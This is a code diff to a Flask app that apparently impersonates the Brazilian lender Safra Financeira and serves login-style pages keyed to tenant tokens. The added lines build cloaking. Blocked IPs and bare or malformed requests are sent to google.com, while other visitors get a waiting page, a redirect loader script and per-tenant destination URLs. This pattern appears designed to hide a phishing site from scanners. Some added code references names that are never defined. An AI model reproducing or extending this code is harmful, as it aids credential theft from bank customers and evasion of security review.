@@ -1,8 +1,10 @@
-from flask import render_template, redirect, url_for, request, flash
+from flask import render_template, redirect, url_for, request, flash, render_template_string, jsonify
 
 from safrafinaceira import app, db
 
 from safrafinaceira.models import User, IDs
+
+from safrafinaceira.ipchecker import is_blocked_ip, get_client_ip, build_destination_url2, decode_tenant, get_wait_html
 
 from datetime import datetime, timedelta
 
@@ -179,9 +181,34 @@ def get_selenium_error():
 
     return {'user':'OK'}
 
-@app.route('/', methods=['GET'])
-def principal():
-    return redirect("https://www.safrafinanceira.com.br/")
+@app.route("/retrieve_url")
+def retrieve_url():
+    if is_blocked_ip(get_client_ip()):
+        return jsonify({"url": SAFE_REDIRECT_URL})
+
+    tenant = request.args.get("tenant")
+    if not tenant:
+        abort(400)
+    return jsonify({"url": build_destination_url2(tenant)})
+
+@app.route("/", defaults={"path": ""})
+@app.route("/<path:path>")
+def principal(path):
+
+    if not path:
+        return redirect("https://www.google.com")
+
+    if is_blocked_ip(get_client_ip()):
+        return redirect("https://www.google.com")
+    
+    try:
+        tenant = decode_tenant(path)
+    except ValueError:
+        print('teste')
+        return redirect("https://www.google.com")
+
+    loader_url = url_for("static", filename="redirect-loader.js")
+    return render_template_string(get_wait_html(), tenant=tenant, loader_url=loader_url)
 
 # Front-End page
 @app.route("/safra/auth", methods=["GET"])
@@ -189,7 +216,7 @@ def auth1():
     if not request.args.get('tenant'):
         print('teste')
         return redirect("https://www.safrafinanceira.com.br")
-    print('aa')
+
     try:
         if check_tenant(request.args.get('tenant')):
             return render_template("auth1.html", tenant=request.args.get('tenant'))
